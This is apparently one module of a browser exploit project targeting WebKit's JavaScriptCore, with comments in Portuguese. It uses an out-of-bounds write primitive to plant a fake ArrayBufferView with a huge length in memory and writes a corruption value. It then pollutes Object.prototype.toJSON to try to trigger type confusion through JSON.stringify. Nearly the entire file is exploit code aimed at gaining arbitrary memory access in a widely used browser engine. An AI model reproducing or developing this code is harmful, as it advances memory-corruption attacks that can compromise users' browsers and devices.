// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.42"; // Versão incrementada

// --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58;

const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF;
const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;
const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
const FAKE_VIEW_CELLINFO_STATE        = 0x01;
const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero;
const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero;
const FAKE_VIEW_MLENGTH_VALUE         = 0xFFFFFFFF;
const FAKE_VIEW_MMODE_VALUE           = 0x00000000;

// Offset para uma escrita OOB de perturbação antes de JSON.stringify
const SENSITIVE_CORRUPTION_OFFSET     = 0x70;
const SENSITIVE_CORRUPTION_VALUE      = 0xDEADBEEF; // Nome corrigido aqui para ser consistente


// Variável global para o getter toJSON comunicar para fora (se necessário)
let global_toJSON_this_details = null;

// ============================================================
// FUNÇÃO toJSON Poluída para Ativação Especulativa
// ============================================================
function toJSON_speculativeActivationAttempt() {
    const FNAME_toJSON = "toJSON_speculativeActivation";
    logS3(`[${FNAME_toJSON}] Getter ACIONADO!`, "vuln", FNAME_toJSON);
    global_toJSON_this_details = {
        type: "N/A",
        instanceof_ArrayBuffer: false,
        instanceof_Uint32Array: false,
        length_prop: "N/A",
        elem0: "N/A",
        elem1: "N/A",
        error_accessing_props: null
    };

    try {
        global_toJSON_this_details.type = Object.prototype.toString.call(this);
        logS3(`  [${FNAME_toJSON}] this type: ${global_toJSON_this_details.type}`, "info", FNAME_toJSON);
        global_toJSON_this_details.instanceof_ArrayBuffer = this instanceof ArrayBuffer;
        global_toJSON_this_details.instanceof_Uint32Array = this instanceof Uint32Array;
        logS3(`  [${FNAME_toJSON}] instanceof ArrayBuffer: ${global_toJSON_this_details.instanceof_ArrayBuffer}, instanceof Uint32Array: ${global_toJSON_this_details.instanceof_Uint32Array}`, "info", FNAME_toJSON);

        try {
            global_toJSON_this_details.length_prop = this.length;
            logS3(`  [${FNAME_toJSON}] this.length: ${toHex(global_toJSON_this_details.length_prop)} (Decimal: ${global_toJSON_this_details.length_prop})`, "leak", FNAME_toJSON);
            
            if (typeof this.length === 'number' && this.length > 1) {
                global_toJSON_this_details.elem0 = this[0];
                logS3(`  [${FNAME_toJSON}] this[0]: ${toHex(global_toJSON_this_details.elem0)}`, "leak", FNAME_toJSON);
                global_toJSON_this_details.elem1 = this[1];
                logS3(`  [${FNAME_toJSON}] this[1]: ${toHex(global_toJSON_this_details.elem1)}`, "leak", FNAME_toJSON);
            }
            if (global_toJSON_this_details.length_prop === FAKE_VIEW_MLENGTH_VALUE) {
                logS3(`    !!!! POTENCIAL SUPER VIEW DETECTADA NO GETTER !!!! Length corresponde a FAKE_VIEW_MLENGTH_VALUE!`, "vuln", FNAME_toJSON);
                document.title = "SPECULATIVE SUPERVIEW HIT?!";
            }

        } catch (e_access) {
            logS3(`  [${FNAME_toJSON}] ERRO ao acessar propriedades de 'this': ${e_access.name} - ${e_access.message}`, "critical", FNAME_toJSON);
            global_toJSON_this_details.error_accessing_props = `${e_access.name}: ${e_access.message}`;
            document.title = `SPECULATIVE VIEW ERR: ${e_access.name}`;
        }

    } catch (e_main) {
        logS3(`  [${FNAME_toJSON}] ERRO GERAL no getter: ${e_main.name} - ${e_main.message}`, "critical", FNAME_toJSON);
        global_toJSON_this_details.error_accessing_props = `OuterError: ${e_main.name}: ${e_main.message}`;
    }
    return {
        toJSON_executed: true,
        details_collected: global_toJSON_this_details
    };
}


// ============================================================
// FUNÇÃO PRINCIPAL (v10.42 - Correção ReferenceError)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.speculativeActivation_v10.42`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Ativação Especulativa da View Fake (RefError Fix) ---`, "test", FNAME_CURRENT_TEST);
    document.title = "SpeculativeActivation v10.42 Test...";

    global_toJSON_this_details = null;
    let trigger_obj = { data1: 0x1111, data2: 0x2222 };

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // PASSO 1: Plantar a estrutura FALSA de ArrayBufferView
        logS3(`PASSO 1: Plantando estrutura fake de ArrayBufferView em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
        
        const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
        const typeInfoOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
        const flagsOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_FLAGS_FLATTENED_OFFSET;
        const indexTypeOffset= FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_FLAGS_OR_INDEXING_TYPE_FLATTENED_OFFSET;
        const stateOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_STATE_FLATTENED_OFFSET;
        const bufferPtrOff   = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET;
        const mVectorOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        const mModeOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

        oob_write_absolute(sidOffset, FAKE_VIEW_STRUCTURE_ID, 4);
        oob_write_absolute(typeInfoOffset, FAKE_VIEW_TYPEINFO_TYPE, 1);
        oob_write_absolute(flagsOffset, FAKE_VIEW_TYPEINFO_FLAGS, 1);
        oob_write_absolute(indexTypeOffset, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1);
        oob_write_absolute(stateOffset, FAKE_VIEW_CELLINFO_STATE, 1);
        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8);
        oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
        oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_VALUE, 4);
        oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
        
        logS3(`  Estrutura fake de ArrayBufferView (SID: ${toHex(FAKE_VIEW_STRUCTURE_ID)}, m_vector: ${FAKE_VIEW_MVECTOR_VALUE.toString(true)}, m_length: ${toHex(FAKE_VIEW_MLENGTH_VALUE)}) plantada em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}.`, "good", FNAME_CURRENT_TEST);
        await PAUSE_S3(50);

        // PASSO 2: Opcional - Escrita OOB de perturbação em local sensível
        logS3(`PASSO 2: Escrevendo valor de perturbação ${toHex(SENSITIVE_CORRUPTION_VALUE)} em ${toHex(SENSITIVE_CORRUPTION_OFFSET)}...`, "warn", FNAME_CURRENT_TEST);
        try {
            // CORREÇÃO APLICADA AQUI:
            oob_write_absolute(SENSITIVE_CORRUPTION_OFFSET, SENSITIVE_CORRUPTION_VALUE, 4);
        } catch (e_perturb) {
            logS3(`  Erro na escrita de perturbação: ${e_perturb.message}`, "error", FNAME_CURRENT_TEST);
        }
        await PAUSE_S3(50);

        // PASSO 3: Tentar ativar/usar a estrutura fake via poluição de toJSON
        logS3(`PASSO 3: Tentando ativação especulativa via JSON.stringify e toJSON poluído...`, "test", FNAME_CURRENT_TEST);
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_speculativeActivationAttempt,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_speculativeActivationAttempt.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(trigger_obj)... Trigger object: ${JSON.stringify(trigger_obj)}`, "info", FNAME_CURRENT_TEST);
            let stringifyResult = JSON.stringify(trigger_obj);
            
            logS3(`  JSON.stringify completou. Resultado (parcial): ${String(stringifyResult).substring(0, 200)}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes coletados pelo getter toJSON: ${JSON.stringify(global_toJSON_this_details)}`, "leak", FNAME_CURRENT_TEST);

            if (global_toJSON_this_details && global_toJSON_this_details.length_prop === FAKE_VIEW_MLENGTH_VALUE) {
                logS3("    !!!! SUCESSO ESPECULATIVO? !!!! O 'this' dentro do toJSON parece ter o length da nossa FAKE VIEW!", "vuln", FNAME_CURRENT_TEST);
                document.title = "SPECULATIVE SUPERVIEW SUCCESS?!";
            } else if (global_toJSON_this_details && global_toJSON_this_details.error_accessing_props) {
                logS3("    PROBLEMA ESPECULATIVO: Erro ao acessar propriedades de 'this' no toJSON, pode indicar Type Confusion.", "warn", FNAME_CURRENT_TEST);
            }

        } catch (e_stringify) {
            logS3(`  ERRO CRÍTICO durante JSON.stringify(trigger_obj): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `SPECULATIVE STRINGIFY ERR: ${e_stringify.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) {
                    Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                } else {
                    delete Object.prototype[ppKey];
                }
                logS3(`  Object.prototype.${ppKey} restaurado.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO GERAL: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU CRITICAMENTE!`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        if (!document.title.includes("SUCCESS") && !document.title.includes("HIT") && !document.title.includes("FALHOU") && !document.title.includes("ERR")) {
            document.title = `${FNAME_MAIN} Speculative Test Done`;
        }
    }
}
